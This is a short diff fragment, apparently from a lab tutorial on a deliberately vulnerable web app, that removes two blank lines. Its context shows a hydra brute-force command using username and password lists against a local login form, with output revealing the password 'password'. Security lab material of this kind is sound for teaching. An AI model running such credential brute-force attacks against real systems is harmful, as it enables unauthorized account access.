@@ -246,5 +246,3 @@ hydra -L usernames.txt -P passwords.txt 127.0.0.1 -s 42001 http-get-form "/vulne
 	Running brute force attack...
 	Password is: password
 	```
-
-
